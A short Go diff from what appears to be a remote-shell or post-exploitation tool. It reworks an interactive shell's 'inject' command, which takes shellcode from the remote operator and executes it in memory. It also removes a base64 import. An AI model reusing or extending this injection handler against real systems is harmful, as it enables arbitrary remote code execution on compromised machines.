@@ -5,7 +5,6 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
-	"encoding/base64"
 	"encoding/hex"
 	"net"
 	"os"
@@ -41,10 +40,8 @@ func InteractiveShell(conn net.Conn) {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
 			case "inject":
-				if argv[1] != "" {
-					if shellcode, err := base64.StdEncoding.DecodeString(argv[1]); err == nil {
-						go shell.ExecShellcode(shellcode)
-					}
+				if len(argv) > 1 {
+					shell.InjectShellcode(argv[1])
 				}
 			case "exit":
 				exit = true
